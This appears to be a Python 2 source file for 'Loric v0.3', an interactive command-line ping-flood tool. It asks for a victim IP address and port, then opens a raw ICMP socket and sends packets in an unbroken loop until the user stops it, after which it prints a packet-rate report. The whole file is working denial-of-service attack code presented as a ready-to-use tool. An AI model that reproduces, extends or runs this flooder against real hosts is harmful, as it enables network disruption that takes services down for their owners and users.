#******************************************************
 # Dioghenes
 # Polytechnic of Turin
 # 2016
 # Loric v0.3
#******************************************************

from time import *
from threading import *
from txtcolors_pylib import *
from pingsuite_pylib import *
from os import name,system
import sys


"""
	Main class
"""
class Loric:
	
	"""
		Init
	"""
	def __init__(self):
		self._version = "0.3"
		self._victim = "0.0.0.0"
		self._port = 0
		self.title()
		self.helper()
		self.loop()
		
		
	"""
		Print the title
	"""
	def title(self):
		if name == "nt":
			system("cls")
		elif name == "posix":
			system("clear")
		else:
			print 10*"\n"
			
		ltitle = ["                _",\
			  " _             |_|       ",\
			  "| |   ___  ___  _  ___",\
			  "| |_ |   ||  _|| || __|",\
			  "|___||___||_|  |_||___|"]
		
		print hprint("Welcome in Loric v"+self._version,col="blue",style="bold")		
		for i in ltitle :
			print hprint(i,col="yellow",style="bold")
		print ""

	"""
		Basic helper
	"""
	def helper(self):
		print "\n  This is a brief helper."
		print "   go   - Perform an attack against a host."
		print "   set  - Set the IP of the victim."
		print "   help - Show this help."
		print "   exit - Quit the program.\n"

	"""
		Main loop
	"""
	def loop(self):
		self.choice = ""
		while self.choice.lower() != "exit":
			self.choice = raw_input(hprint("LORIC > ",col="red",style="bold"))
			if self.choice.lower() == "exit":
				print "  INFO> Bye!"
				break
			elif self.choice == "go":
				if self._victim == "0.0.0.0":
					self._victim = raw_input("  SET> IP address: ")
				print "  SET> The attack against "+self._victim+" is going to be performed.",
				self.confirm = raw_input("Are You sure (Y/N)?  ")
				if self.confirm.lower() == "y":
					self.attack()
				elif self.confirm.lower() == "n":
					print "  INFO> Aborted." 
				else:
					print "  ERR> Invalid confirmation value."
			elif self.choice.lower() == "help":
				self.helper()
			elif self.choice.lower() == "set":
				self._victim = raw_input("  SET> Set the IP address: ")
				self._port = raw_input("  SET> Set the port to connect to: ")
				try:
					if self._port == "":
						self._port = 0
					self._port = int(self._port)
				except:
					print "  ERR> Invalid port."
			else:
				print "  ERR> Invalid command."

	"""
		Ping flood main cycle
	"""
	def attack(self):
		print "  INFO> Running..."
		cnterr = 0
		cnt = 0
		try:
			sock = socket(AF_INET,SOCK_RAW,1)
		except Exception,msg:
			if "101" in msg:
				print "  ERR> You need the root permission to perform an attack."
			else:
				print "  ERR> Invalid socket."
			return
		defPort = 0
		packetToSend = ICMPpacket()
		sock.connect((self._victim,self._port))
		sock.settimeout(0.01)
		t0 = time()
		try:
			while 1:
				try:
					sock.sendto(packetToSend,(self._victim,defPort))
					cnt += 1 
				except KeyboardInterrupt:
					raise KeyboardInterrupt
				except:
					cnterr += 1
					cnt += 1
					print "  INFO> %d packets failed.\r" %cnterr,
					sys.stdout.flush()
				

		except KeyboardInterrupt:
			t1 = time()
			print "\r    Attack stopped by user. Brief report:"
			print "    "+str(t1-t0)+" seconds elapsed."
			print "    "+str(cnt)+" packets sent."
			print "    "+str(cnterr)+" packets timed out."
			print "    Ratio: "+str((cnt-cnterr)/(t1-t0))+" packets/sec."


""" 
	Create an instance of the class 
"""
Loric()
